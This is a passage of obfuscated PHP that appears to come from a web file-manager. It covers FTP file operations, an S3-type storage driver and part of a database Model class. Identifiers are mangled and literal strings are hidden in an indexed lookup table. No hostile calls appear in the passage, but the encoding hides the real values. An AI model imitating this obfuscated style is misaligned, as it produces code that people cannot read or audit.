$this->iconvApp($¿íª·•ƒ); $this->download($©ƒŒ°‚, $ÒÃÚáİ‚); $«ÏÃ”Ç´ = $this->upload($Àå°—æó, $ÒÃÚáİ‚); $this->tempFileRemve($¿íª·•ƒ); return $«ÏÃ”Ç´; } public function moveFile($”¿õ®Øª, $Çò¼µò‡) { if (!$this->_isconn()) { return !1; } $”¿õ®Øª = $this->iconvSystem($”¿õ®Øª); $Çò¼µò‡ = $this->iconvSystem($Çò¼µò‡); $ºŒ”éš = @ftp_rename($this->connect, $”¿õ®Øª, $Çò¼µò‡); if (!$ºŒ”éš) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } return $this->getPathOuter($Çò¼µò‡); } public function delFile($íô‡ŞÄù) { if (!$this->_isconn()) { return !1; } $íô‡ŞÄù = $this->iconvSystem($íô‡ŞÄù); $ûÎàİ¿Ø = @ftp_delete($this->connect, $íô‡ŞÄù); if (!$ûÎàİ¿Ø) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); } return $ûÎàİ¿Ø; } public function delFolder($’Ì»ĞÕ°) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÁÕÜº®€ = $Ô€¨÷ëé = array(); $this->fileList($’Ì»ĞÕ°, $ÁÕÜº®€, $Ô€¨÷ëé, !0); $this->listItemCache = !0; foreach ($Ô€¨÷ëé as $ˆ¦Ë ñ) { $èË½ı¹‡ = $this->iconvSystem($ˆ¦Ë ñ[$_SERVER[øşô´çË][42]]); $€£Ñİ¼ä = @ftp_delete($this->connect, $èË½ı¹‡); if (!$€£Ñİ¼ä) { return !1; } } foreach ($ÁÕÜº®€ as $èË½ı¹‡) { $èË½ı¹‡ = $this->iconvSystem($èË½ı¹‡); $€£Ñİ¼ä = @ftp_rmdir($this->connect, $èË½ı¹‡); if (!$€£Ñİ¼ä) { return !1; } } $’Ì»ĞÕ° = $this->iconvSystem($’Ì»ĞÕ°); return @ftp_rmdir($this->connect, $’Ì»ĞÕ°); } public function rename($Èü°éÃÜ, $†ÀŞ†±Ê) { $ø’š‰‘« =& $_SERVER[øşô´çË]; if (!$this->_isconn()) { return !1; } $•¢Ö”âœ = $this->fileNameAuto($this->pathFather($Èü°éÃÜ), $†ÀŞ†±Ê); $•¢Ö”âœ = $this->iconvSystem($•¢Ö”âœ); $Èü°éÃÜ = $this->iconvSystem($Èü°éÃÜ); $§Ô¨ÁÅ = $this->pathFather($Èü°éÃÜ); $„Öå = rtrim($§Ô¨ÁÅ, $ø’š‰‘«[8]) . $ø’š‰‘«[8] . $•¢Ö”âœ; $£È­à¬Ì = @ftp_rename($this->connect, $Èü°éÃÜ, $„Öå); if (!$£È­à¬Ì) { $this->writeLog(__FUNCTION__ . $ø’š‰‘«[1654], !0); return !1; } $„Öå = $this->iconvApp($„Öå); return $this->getPathOuter($„Öå); } private function folderInfo($€Ó³ßáó, $ùäÙªÜò = false) { $¥ôËˆíÌ =& $_SERVER[øşô´çË]; $áª˜Ö¨Ë = array($¥ôËˆíÌ[42] => $this->pathThis($€Ó³ßáó), $¥ôËˆíÌ[97] => $this->getPathOuter($¥ôËˆíÌ[8] . $€Ó³ßáó), $¥ôËˆíÌ[43] => $¥ôËˆíÌ[88]); if ($ùäÙªÜò) { return $áª˜Ö¨Ë; } $áª˜Ö¨Ë[$¥ôËˆíÌ[241]] = $áª˜Ö¨Ë[$¥ôËˆíÌ[98]] = 0; $áª˜Ö¨Ë[$¥ôËˆíÌ[242]] = $áª˜Ö¨Ë[$¥ôËˆíÌ[243]] = !0; return $áª˜Ö¨Ë; } private function fileInfo($Å±ÙÏ‰é, $”¯Æ¡òÛ = false, $È¶áÃ¹ğ = array()) { $òâÎ“Î =& $_SERVER[øşô´çË]; $Ãğ•¬ï´ = array($òâÎ“Î[42] => $this->pathThis($Å±ÙÏ‰é), $òâÎ“Î[97] => $this->getPathOuter($òâÎ“Î[8] . $Å±ÙÏ‰é), $òâÎ“Î[43] => $òâÎ“Î[240], $òâÎ“Î[89] => isset($È¶áÃ¹ğ[$òâÎ“Î[89]]) ? $È¶áÃ¹ğ[$òâÎ“Î[89]] : 0, $òâÎ“Î[176] => $this->ext($Å±ÙÏ‰é)); if ($”¯Æ¡òÛ) { return $Ãğ•¬ï´; } $Ãğ•¬ï´[$òâÎ“Î[241]] = $Ãğ•¬ï´[$òâÎ“Î[98]] = 0; $Ãğ•¬ï´[$òâÎ“Î[242]] = $Ãğ•¬ï´[$òâÎ“Î[243]] = !0; $©µÈ°êª = $this->iconvSystem($Å±ÙÏ‰é); $Ãğ•¬ï´[$òâÎ“Î[98]] = @ftp_mdtm($this->connect, $©µÈ°êª); if (empty($È¶áÃ¹ğ)) { $È¶áÃ¹ğ = $this->objectMeta($Å±ÙÏ‰é); if (!$È¶áÃ¹ğ) { return $Ãğ•¬ï´; } } $Ãğ•¬ï´[$òâÎ“Î[89]] = $È¶áÃ¹ğ[$òâÎ“Î[89]]; return $Ãğ•¬ï´; } public function size($ğ‹»áœŞ) { $ÃÒï¸ÆÎ = $this->objectMeta($ğ‹»áœŞ); return $ÃÒï¸ÆÎ ? $ÃÒï¸ÆÎ[$_SERVER[øşô´çË][89]] : 0; } public function info($›£›Àô) { if ($this->isFile($›£›Àô)) { return $this->fileInfo($›£›Àô, 0); } else { if ($this->isFolder($›£›Àô)) { return $this->folderInfo($›£›Àô); } } return !1; } private function fileList($ã»ı°§º, &$Ÿ­ŒÛæ, &$–Ÿ¤Â–ş, $‘²Ë’€î = false) { $èçÑ¨ñÜ =& $_SERVER[øşô´çË]; $ã»ı°§º = $this->iconvSystem($ã»ı°§º); if (!$this->isFolder($ã»ı°§º)) { return !1; } $ã»ı°§º = rtrim($ã»ı°§º, $èçÑ¨ñÜ[8]) . $èçÑ¨ñÜ[8]; check_abort(); $ö¢·Ö‹â = @ftp_rawlist($this->connect, $ã»ı°§º); if (!$ö¢·Ö‹â) { $ö¢·Ö‹â = array(); } $ç¡Õù„¬ = array($èçÑ¨ñÜ[10] => 1, $èçÑ¨ñÜ[1464] => 1); foreach ($ö¢·Ö‹â as $»‚õ×) { $ÔŞ¬ª„ = $this->_listItem($»‚õ×); if ($ÔŞ¬ª„[0] == $èçÑ¨ñÜ[861]) { continue; } $İùğ©ÚÊ = $ÔŞ¬ª„[8]; if (empty($İùğ©ÚÊ) && $İùğ©ÚÊ !== $èçÑ¨ñÜ[238] || isset($ç¡Õù„¬[$İùğ©ÚÊ])) { continue; } $İùğ©ÚÊ = $this->iconvApp($ã»ı°§º . ltrim($İùğ©ÚÊ, $èçÑ¨ñÜ[8])); $ŸÒŠŒ = array($èçÑ¨ñÜ[42] => $İùğ©ÚÊ, $èçÑ¨ñÜ[43] => $èçÑ¨ñÜ[240], $èçÑ¨ñÜ[89] => $ÔŞ¬ª„[4]); if (substr($»‚õ×, 0, 1) == $èçÑ¨ñÜ[1655]) { $ŸÒŠŒ[$èçÑ¨ñÜ[43]] = $èçÑ¨ñÜ[88]; $ŸÒŠŒ[$èçÑ¨ñÜ[89]] = 0; } $€¬ŞŸ°Â = $ŸÒŠŒ[$èçÑ¨ñÜ[43]] == $èçÑ¨ñÜ[88] ? !0 : !1; $this->cacheMethodInfoSet($İùğ©ÚÊ, $€¬ŞŸ°Â, $ŸÒŠŒ); if ($€¬ŞŸ°Â) { $Ÿ­ŒÛæ[] = $İùğ©ÚÊ; if ($‘²Ë’€î) { $this->fileList($İùğ©ÚÊ, $Ÿ­ŒÛæ, $–Ÿ¤Â–ş, $‘²Ë’€î); } continue; } $–Ÿ¤Â–ş[] = $ŸÒŠŒ; } $this->cacheMethodInfoSet($ã»ı°§º, !0); } private function _listItem($ë•æ¦ŒŒ) { if (empty($ë•æ¦ŒŒ)) { return array(); } $˜äÁ¥“š = preg_split($_SERVER[øşô´çË][1656], $ë•æ¦ŒŒ); if (count($˜äÁ¥“š) <= 9) { return $˜äÁ¥“š; } $˜äÁ¥“š[8] = trim(substr($ë•æ¦ŒŒ, strpos($ë•æ¦ŒŒ, $˜äÁ¥“š[7]) + strlen($˜äÁ¥“š[7]))); return array_splice($˜äÁ¥“š, 0, 9); } public function listPath($ÁÉ™å, $ŠäÍö“‡ = false) { $ñƒã— =& $_SERVER[øşô´çË]; if (!$this->_isconn()) { return !1; } $ù†ÆãÅÒ = $ßêú¤´Ÿ = array(); $this->fileList($ÁÉ™å, $ù†ÆãÅÒ, $ßêú¤´Ÿ); foreach ($ù†ÆãÅÒ as $š’İ‡½ => $”ö€¹”œ) { $ù†ÆãÅÒ[$š’İ‡½] = $this->folderInfo($”ö€¹”œ, $ŠäÍö“‡); } foreach ($ßêú¤´Ÿ as $š’İ‡½ => $”ö€¹”œ) { $ßêú¤´Ÿ[$š’İ‡½] = $this->fileInfo($”ö€¹”œ[$ñƒã—[42]], $ŠäÍö“‡, $”ö€¹”œ); } return array($ñƒã—[95] => $ù†ÆãÅÒ, $ñƒã—[96] => $ßêú¤´Ÿ); } public function has($«”¿òµî, $•úÏÔî = false, $ÁĞ¶Ê  = true) { $Ã²šÇáô =& $_SERVER[øşô´çË]; $šå¡âêç = $ÉšÓúåÅ = array(); $âíƒş¸ = $•úÏÔî ? !0 : !1; $this->fileList($«”¿òµî, $šå¡âêç, $ÉšÓúåÅ, $âíƒş¸); if ($•úÏÔî) { return array($Ã²šÇáô[249] => count($ÉšÓúåÅ), $Ã²šÇáô[250] => count($šå¡âêç)); } if ($ÁĞ¶Ê ) { if (count($ÉšÓúåÅ)) { return !0; } } else { if (count($šå¡âêç)) { return !0; } } return !1; } public function listAll($¼Òê‡ ó) { $¼Ù‘ùÖÚ =& $_SERVER[øşô´çË]; if (!$this->_isconn()) { return !1; } $Ôö±æ½ª = $‘çÚ¤Èé = array(); $this->fileList($¼Òê‡ ó, $Ôö±æ½ª, $‘çÚ¤Èé, !0); $ÊøÕ ¬ù = array_to_keyvalue($‘çÚ¤Èé, $¼Ù‘ùÖÚ[42]); foreach ($Ôö±æ½ª as $ÛÃ€È±ü) { if (is_string($ÛÃ€È±ü)) { $ÊøÕ ¬ù[$ÛÃ€È±ü] = array($¼Ù‘ùÖÚ[89] => 0); } } return $this->listAllFiles($¼Òê‡ ó, $ÊøÕ ¬ù); } public function getContent($¡‚À¬‰±) { if (!$this->_isconn()) { return !1; } $¡‚À¬‰± = $this->iconvSystem($¡‚À¬‰±); return $this->fileSubstr($¡‚À¬‰±); } public function setContent($Ò•û—ÀÓ, $÷Éáˆæ = '') { if (!$this->_isconn()) { return !1; } $‘øÙëÂÎ = $this->pathThis($this->iconvSystem($Ò•û—ÀÓ)); $à»ä»™ä = $this->tempFile($‘øÙëÂÎ); file_put_contents($à»ä»™ä, $÷Éáˆæ); $¥Ë’Ïó  = $this->upload($Ò•û—ÀÓ, $this->iconvApp($à»ä»™ä)); $this->tempFileRemve($à»ä»™ä); return $¥Ë’Ïó ; } public function fileSubstr($…†ˆœœ÷, $×®¹‰… = 0, $åÚÎäû = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($…†ˆœœ÷, $×®¹‰…, $åÚÎäû); } private function ftpRequest($ »ˆµ¨È, $˜§ÛÉ¶‚ = 0, $œ­Ôòñ÷ = false) { $Ò«âúèó =& $_SERVER[øşô´çË]; $ »ˆµ¨È = $Ò«âúèó[8] . ltrim(str_ltrim($ »ˆµ¨È, $this->ftpPath), $Ò«âúèó[8]); $ »ˆµ¨È = $this->iconvSystem($ »ˆµ¨È); $ÀìĞš½† = $this->scheme . $this->host . $Ò«âúèó[4] . $this->port; $ğ’»Ôœî = curl_init(); curl_setopt($ğ’»Ôœî, CURLOPT_URL, $ÀìĞš½† . $this->pathEncode($ »ˆµ¨È)); curl_setopt($ğ’»Ôœî, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($œ­Ôòñ÷) { $ËÄ«ƒ¼ = $˜§ÛÉ¶‚ + $œ­Ôòñ÷ - 1; curl_setopt($ğ’»Ôœî, CURLOPT_RANGE, "{$˜§ÛÉ¶‚}\55{$ËÄ«ƒ¼}"); } curl_setopt($ğ’»Ôœî, CURLOPT_RETURNTRANSFER, 1); $ĞÁîÙÚ = curl_exec($ğ’»Ôœî); curl_close($ğ’»Ôœî); return $ĞÁîÙÚ; } public function upload($¼ıŠâ„, $¶µİ½¿Ô, $ÅÂŞàİ = false, $Ö¤œ = REPEAT_REPLACE) { if (!$¶µİ½¿Ô || !@file_exists($¶µİ½¿Ô)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¼ıŠâ„))) { return !1; } $¼ıŠâ„ = $this->iconvSystem($¼ıŠâ„); $¶µİ½¿Ô = $this->iconvSystem($¶µİ½¿Ô); $¥¤‡ı¨ = ftp_nb_put($this->connect, $¼ıŠâ„, $¶µİ½¿Ô, FTP_BINARY); while ($¥¤‡ı¨ == FTP_MOREDATA) { $¥¤‡ı¨ = ftp_nb_continue($this->connect); } if ($¥¤‡ı¨ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } return $this->getPathOuter($¼ıŠâ„); } public function download($É¶ŸÃÓ±, $ï©…°‡å = '') { if (!$this->_isconn()) { return !1; } $…£øŠÖ» = $this->pathFather($ï©…°‡å); if (!IO::mkdir($…£øŠÖ»)) { return !1; } $É¶ŸÃÓ± = $this->iconvSystem($É¶ŸÃÓ±); $ï©…°‡å = $this->iconvSystem($ï©…°‡å); $ˆâƒ†„… = ftp_nb_get($this->connect, $ï©…°‡å, $É¶ŸÃÓ±, FTP_BINARY); while ($ˆâƒ†„… == FTP_MOREDATA) { $ˆâƒ†„… = ftp_nb_continue($this->connect); } if ($ˆâƒ†„… != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } return $this->iconvApp($ï©…°‡å); } public function exist($¥ÂèÑ´¨) { return $this->isFile($¥ÂèÑ´¨) || $this->isFolder($¥ÂèÑ´¨); } public function isFile($ÂÁÁñ–Ë) { return !$this->isFolder($ÂÁÁñ–Ë) && $this->objectMeta($ÂÁÁñ–Ë); } public function isFolder($ÌûæÓâç) { return $this->cacheMethod($_SERVER[øşô´çË][187], $ÌûæÓâç); } protected function objectMeta($Éù–ö‰) { return $this->cacheMethod($_SERVER[øşô´çË][189], $Éù–ö‰); } protected function _objectMeta($‡Ø±îîß) { $¾ÔâÌ®’ =& $_SERVER[øşô´çË]; if ($‡Ø±îîß == $¾ÔâÌ®’[12] || $‡Ø±îîß == $¾ÔâÌ®’[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‡Ø±îîß = $this->iconvSystem($‡Ø±îîß); $äˆ©øĞ = array($¾ÔâÌ®’[42] => $this->iconvApp($‡Ø±îîß), $¾ÔâÌ®’[43] => $¾ÔâÌ®’[240], $¾ÔâÌ®’[89] => 0); $†«¤ÓÛò = @ftp_size($this->connect, $‡Ø±îîß); if ($†«¤ÓÛò != -1) { $äˆ©øĞ[$¾ÔâÌ®’[89]] = $†«¤ÓÛò; } else { $çÎÊÈû¬ = @ftp_chdir($this->connect, $‡Ø±îîß); if (!$çÎÊÈû¬) { return !1; } @ftp_chdir($this->connect, $¾ÔâÌ®’[8]); $äˆ©øĞ[$¾ÔâÌ®’[43]] = $¾ÔâÌ®’[88]; } return $äˆ©øĞ; } protected function _isFolder($Ñ¨¥¸­Û) { $ˆ‚Ïêèó =& $_SERVER[øşô´çË]; if ($Ñ¨¥¸­Û == $ˆ‚Ïêèó[12] || $Ñ¨¥¸­Û == $ˆ‚Ïêèó[8]) { return !0; } $†âŞ¶´ = $this->_objectMeta($Ñ¨¥¸­Û); return isset($†âŞ¶´[$ˆ‚Ïêèó[43]]) && $†âŞ¶´[$ˆ‚Ïêèó[43]] == $ˆ‚Ïêèó[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¨ÖéèÙ×) { parent::__construct($¨ÖéèÙ×); $this->setSignVersion($_SERVER[øşô´çË][257]); } public function uploadLink($…ÉïÜ‡, $ûºÙéµ = 0) { $ Ääì³¢ =& $_SERVER[øşô´çË]; if ($this->isUploadServer()) { return; } $Ø·‘è×Ì = $this->getType(); if (!in_array($Ø·‘è×Ì, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ˆĞÒ©Òñ = (!$ûºÙéµ ? 1 : ceil($ûºÙéµ / pow(1024, 3))) * 3600 * 4; $¦Ôì›¡× = $this->uploadMultiData($…ÉïÜ‡, $ˆĞÒ©Òñ); if ($¦Ôì›¡×) { $¦Ôì›¡×[$ Ääì³¢[105]] = $…ÉïÜ‡; $¦Ôì›¡×[$ Ääì³¢[106]] = $Ø·‘è×Ì; } return $¦Ôì›¡×; } public function fileOutImage($ŠÍœÌ¦˜, $’±¸Á·§ = 250) { if ($this->size($ŠÍœÌ¦˜) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ŠÍœÌ¦˜, $’±¸Á·§); } $ÕíœóúÓ = $this->link($ŠÍœÌ¦˜); $ÕíœóúÓ .= $_SERVER[øşô´çË][1657] . $’±¸Á·§; $this->fileOutLink($ÕíœóúÓ); } } goto AÇÑ¨¦İ°ó; cáµ¯î†¢æ: define($_SERVER[øşô´çË][329], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\x6f\162\x64\145\x72", "\141\x6c\x69\141\x73", "\x68\141\x76\x69\x6e\147", "\147\x72\x6f\165\160", "\154\x6f\143\153", "\144\x69\x73\164\151\x6e\143\164", "\x61\165\x74\157", "\146\x69\x6c\x74\x65\162", "\x76\141\x6c\x69\x64\x61\164\145", "\162\145\163\165\154\x74", "\142\x69\x6e\x64", "\164\x6f\x6b\145\156"); public function __construct($è‚Ïâ€Õ = '', $°°¥ù­ = '', $ÇÙˆšÑ™ = '') { $ûáªõ‚á =& $_SERVER[øşô´çË]; $this->_initialize(); if (!empty($è‚Ïâ€Õ)) { if (strpos($è‚Ïâ€Õ, $ûáªõ‚á[10])) { list($this->dbName, $this->name) = explode($ûáªõ‚á[10], $è‚Ïâ€Õ); } else { $this->name = $è‚Ïâ€Õ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($°°¥ù­)) { $this->tablePrefix = $ûáªõ‚á[12]; } elseif ($ûáªõ‚á[12] != $°°¥ù­) { $this->tablePrefix = $°°¥ù­; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ûáªõ‚á[330]); } $this->db(0, empty($this->connection) ? $ÇÙˆšÑ™ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ñöıĞŠ³ =& $_SERVER[øşô´çË]; if (empty($this->fields)) { if (think_config($ñöıĞŠ³[331])) { $¥½ô£ô‰ = $this->dbName ? $this->dbName : think_config($ñöıĞŠ³[332]); $ÁØ®®ì = think_var_cache($ñöıĞŠ³[333] . strtolower(get_path_this($¥½ô£ô‰) . $ñöıĞŠ³[10] . $this->name)); if ($ÁØ®®ì) { $Š¯ÚÀÍ¬ = think_config($ñöıĞŠ³[334]); if (empty($Š¯ÚÀÍ¬) || $ÁØ®®ì[$ñöıĞŠ³[335]] == $Š¯ÚÀÍ¬) { $this->fields = $ÁØ®®ì; return; } } } $this->flush(); } } public function flush() { $Øœğ¦¤Ç =& $_SERVER[øşô´çË]; $this->db->setModel($this->name); $½Èô‡ã = $this->db->getFields($this->getTableName()); if (!$½Èô‡ã) { return !1; } $this->fields = array_keys($½Èô‡ã); $this->fields[$Øœğ¦¤Ç[336]] = !1; foreach ($½Èô‡ã as $÷İü—£ => $ú÷ ÷úé) { $¶şÊÅìŞ[$÷İü—£] = $ú÷ ÷úé[$Øœğ¦¤Ç[43]]; if ($ú÷ ÷úé[$Øœğ¦¤Ç[49]]) { $this->fields[$Øœğ¦¤Ç[337]] = $÷İü—£; if ($ú÷ ÷úé[$Øœğ¦¤Ç[52]]) { $this->fields[$Øœğ¦¤Ç[336]] = !0; } } } $this->fields[$Øœğ¦¤Ç[338]] = $¶şÊÅìŞ; if (think_config($Øœğ¦¤Ç[334])) { $this->fields[$Øœğ¦¤Ç[335]] = think_config($Øœğ¦¤Ç[334]); } if (think_config($Øœğ¦¤Ç[331])) { $Öã€º“º = $this->dbName ? $this->dbName : think_config($Øœğ¦¤Ç[332]); think_var_cache($Øœğ¦¤Ç[333] . strtolower(get_path_this($Öã€º“º) . $Øœğ¦¤Ç[10] . $this->name), $this->fields); } } public function switchModel($à´¨®½, $ï±Ïı¶ = array()) { $¦Ä·İ§ç =& $_SERVER[øşô´çË]; $®‰‹³© = ucwords(strtolower($à´¨®½)) . $¦Ä·İ§ç[339]; if (!class_exists($®‰‹³©)) { think_exception($®‰‹³© . think_lang($¦Ä·İ§ç[340])); } $this->_extModel = new $®‰‹³©($this->name); if (!empty($ï±Ïı¶)) { foreach ($ï±Ïı¶ as $™ì¨ØÚô) { $this->_extModel->setProperty($™ì¨ØÚô, $this->{$™ì¨ØÚô}); } } return $this->_extModel; } public function __set($»ô”ƒ´ç, $óöÏ˜Ó¯) { $this->data[$»ô”ƒ´ç] = $óöÏ˜Ó¯; } public function __get($şÄ¿Í€Û) { return isset($this->data[$şÄ¿Í€Û]) ? $this->data[$şÄ¿Í€Û] : null; } public function __isset($Ñ’¹¸) { return isset($this->data[$Ñ’¹¸]); } public function __unset($¢´¹Ÿ«) { unset($this->data[$¢´¹Ÿ«]); } public function __call($˜ş¢öÙ­, $ë€ıÈë“) { $å‹É´÷Ş =& $_SERVER[øşô´çË]; if (in_array(strtolower($˜ş¢öÙ­), $this->methods, !0)) { $this->options[strtolower($˜ş¢öÙ­)] = $ë€ıÈë“[0]; return $this; } elseif (in_array(strtolower($˜ş¢öÙ­), array($å‹É´÷Ş[341], $å‹É´÷Ş[342], $å‹É´÷Ş[343], $å‹É´÷Ş[344], $å‹É´÷Ş[345]), !0)) { $¨üÈ¡ÈÒ = isset($ë€ıÈë“[0]) ? $ë€ıÈë“[0] : $å‹É´÷Ş[230]; $¨üÈ¡ÈÒ = $this->db->parseKey($¨üÈ¡ÈÒ); return $this->getField(strtoupper($˜ş¢öÙ­) . $å‹É´÷Ş[346] . $¨üÈ¡ÈÒ . $å‹É´÷Ş[347] . $˜ş¢öÙ­, $å‹É´÷Ş[341]); } elseif (strtolower(substr($˜ş¢öÙ­, 0, 5)) == $å‹É´÷Ş[348]) { $¨üÈ¡ÈÒ = think_parse_name(substr($˜ş¢öÙ­, 5)); $ˆÄìÙÁ[$¨üÈ¡ÈÒ] = $ë€ıÈë“[0]; return $this->where($ˆÄìÙÁ)->find(); } elseif (strtolower(substr($˜ş¢öÙ­, 0, 10)) == $å‹É´÷Ş[349]) { $ßÍ“Ñè = think_parse_name(substr($˜ş¢öÙ­, 10)); $ˆÄìÙÁ[$ßÍ“Ñè] = $ë€ıÈë“[0]; return $this->where($ˆÄìÙÁ)->getField($ë€ıÈë“[1]); } elseif (isset($this->_scope[$˜ş¢öÙ­])) { return $this->scope($˜ş¢öÙ­, $ë€ıÈë“[0]); } elseif (method_exists($this, $˜ş¢öÙ­) || method_exists($this, $å‹É´÷Ş[350] . $˜ş¢öÙ­)) { array_unshift($ë€ıÈë“, $˜ş¢öÙ­); return call_user_func_array(array($this, $å‹É´÷Ş[351]), $ë€ıÈë“); } else { return call_user_func_array(array(parent, $˜ş¢öÙ­), $ë€ıÈë“); } } protected function call() { $ÛàìÜî­ =& $_SERVER[øşô´çË]; $Û¶´‡èä = func_get_args(); $ÚÌû¿“ = array_shift($Û¶´‡èä); $¾ßâÑ§ = $ÚÌû¿“; if (is_array($ÚÌû¿“)) { $¾ßâÑ§ = $ÚÌû¿“[1]; $ÚÌû¿“ = $ÚÌû¿“[0]; } $»ÀüóÉì = count($Û¶´‡èä) - 1; if (isset($Û¶´‡èä[$»ÀüóÉì]) && $Û¶´‡èä[$»ÀüóÉì] === $ÚÌû¿“) { think_exception(__CLASS__ . $ÛàìÜî­[4] . $ÚÌû¿“ . think_lang($ÛàìÜî­[352])); return; } $Û¶´‡èä[] = $ÚÌû¿“; if (method_exists($this, $ÛàìÜî­[353])) { $«­“·¿÷ = call_user_func_array(array($this, $ÛàìÜî­[354]), array($¾ßâÑ§, $Û¶´‡èä)); if (!is_null($«­“·¿÷) && $«­“·¿÷ !== !1) { return $«­“·¿÷; } } $‡é‡˜… = !1; if (method_exists($this, $ÚÌû¿“)) { $‡é‡˜… = call_user_func_array(array($this, $ÚÌû¿“), $Û¶´‡èä); } if (method_exists($this, $ÛàìÜî­[355])) { $«­“·¿÷ = call_user_func_array(array($this, $ÛàìÜî­[356]), array($¾ßâÑ§, $Û¶´‡èä, $‡é‡˜…)); if ($«­“·¿÷) { return $«­“·¿÷; } } return $‡é‡˜…; } protected function _initialize() { } protected function _facade($µ¸Ÿ‡ùÏ) { $Ó°óî × =& $_SERVER[øşô´çË]; if (!empty($this->fields)) { foreach ($µ¸Ÿ‡ùÏ as $€™ëô·Ë => $§İ¨³µ) { if (is_array($this->fields) && !in_array($€™ëô·Ë, $this->fields, !0)) { unset($µ¸Ÿ‡ùÏ[$€™ëô·Ë]); } elseif (is_scalar($§İ¨³µ)) { $this->_parseType($µ¸Ÿ‡ùÏ, $€™ëô·Ë); } } } if (!empty($this->options[$Ó°óî ×[357]])) { $µ¸Ÿ‡ùÏ = array_map($this->options[$Ó°óî ×[357]], $µ¸Ÿ‡ùÏ); unset($this->options[$Ó°óî ×[357]]); } $this->_beforeWrite($µ¸Ÿ‡ùÏ); return $µ¸Ÿ‡ùÏ; } protected function _beforeWrite(&$åø¨‚œ) { } public function add($àÎŞ õ’ = '', $Š´¤Üà = array(), $ò³ØôÁø = false) { if (empty($àÎŞ õ’)) { if (!empty($this->data)) { $àÎŞ õ’ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[øşô´çË][358]); return !1; } } $Š´¤Üà = $this->_parseOptions($Š´¤Üà); $àÎŞ õ’ = $this->_facade($àÎŞ õ’); if (!1 === $this->_beforeInsert($àÎŞ õ’, $Š´¤Üà)) { return !1; } $É‚Îí¬” = $this->db->insert($àÎŞ õ’, $Š´¤Üà, $ò³ØôÁø); if (!1 !== $É‚Îí¬”) { $í«âÈÃí = $this->getLastInsID(); if ($í«âÈÃí) { $àÎŞ õ’[$this->getPk()] = $í«âÈÃí; $this->_after_insert($àÎŞ õ’, $Š´¤Üà); return $í«âÈÃí; } $this->_after_insert($àÎŞ õ’, $Š´¤Üà); } return $É‚Îí¬”; } protected function _beforeInsert(&$Ê€ûÍ¼, $Å´šœ) { } protected function _after_insert($¢öä¹ò©, $ÔêŸ¥á) { } public function addAll($Æáœ¨ë, $˜ªòŞí = array(), $¥†™ ø = false) { $Ü°ŸÒòÚ =& $_SERVER[øşô´çË]; if (empty($Æáœ¨ë)) { $this->error = think_lang($Ü°ŸÒòÚ[358]); return !1; } $˜ªòŞí = $this->_parseOptions($˜ªòŞí); foreach ($Æáœ¨ë as $¬ºß€Äµ => $úÎé¯ñ¡) { $Æáœ¨ë[$¬ºß€Äµ] = $this->_facade($úÎé¯ñ¡); } if (method_exists($this->db, $Ü°ŸÒòÚ[359])) { $ıûÊóæ“ = $this->db->insertAll($Æáœ¨ë, $˜ªòŞí, $¥†™ ø); } else { $this->startTrans(); foreach ($Æáœ¨ë as $¬ºß€Äµ => $úÎé¯ñ¡) { $ıûÊóæ“ = $this->db->insert($úÎé¯ñ¡, $˜ªòŞí, $¥†™ ø); } $this->commit(); } if (!1 !== $ıûÊóæ“) { $¤©ã¢È = $this->getLastInsID(); if ($¤©ã¢È) { return $¤©ã¢È; } } return $ıûÊóæ“; } public function selectAdd($ë¶„Ø¸’ = '', $¿² ¬Ö° = '', $÷õ³¡¥ = array()) { $šı³¼À =& $_SERVER[øşô´çË]; $÷õ³¡¥ = $this->_parseOptions($÷õ³¡¥); if (!1 === ($äÏ¼ë‹­ = $this->db->selectInsert($ë¶„Ø¸’ ? $ë¶„Ø¸’ : $÷õ³¡¥[$šı³¼À[360]], $¿² ¬Ö° ? $¿² ¬Ö° : $this->getTableName(), $÷õ³¡¥))) { $this->error = think_lang($šı³¼À[361]); return !1; } else { return $äÏ¼ë‹­; } } public function save($¯ÓË¶“´ = '', $Õå˜Ëã• = array()) { $“ˆ…»¾Ÿ =& $_SERVER[øşô´çË]; if (empty($¯ÓË¶“´)) { if (!empty($this->data)) { $¯ÓË¶“´ = $this->data; $this->data = array(); } else { $this->error = think_lang($“ˆ…»¾Ÿ[358]); return !1; } } $¯ÓË¶“´ = $this->_facade($¯ÓË¶“´); $Õå˜Ëã• = $this->_parseOptions($Õå˜Ëã•); $Ö‡óâ›Ö = $this->getPk(); if (!isset($Õå˜Ëã•[$“ˆ…»¾Ÿ[362]])) { if (isset($¯ÓË¶“´[$Ö‡óâ›Ö])) { $¾¼•ö“ƒ[$Ö‡óâ›Ö] = $¯ÓË¶“´[$Ö‡óâ›Ö]; $Õå˜Ëã•[$“ˆ…»¾Ÿ[362]] = $¾¼•ö“ƒ; unset($¯ÓË¶“´[$Ö‡óâ›Ö]); } else { $this->error = think_lang($“ˆ…»¾Ÿ[361]); return !1; } } if (is_array($Õå˜Ëã•[$“ˆ…»¾Ÿ[362]]) && isset($Õå˜Ëã•[$“ˆ…»¾Ÿ[362]][$Ö‡óâ›Ö])) { $­Øš½‚Œ = 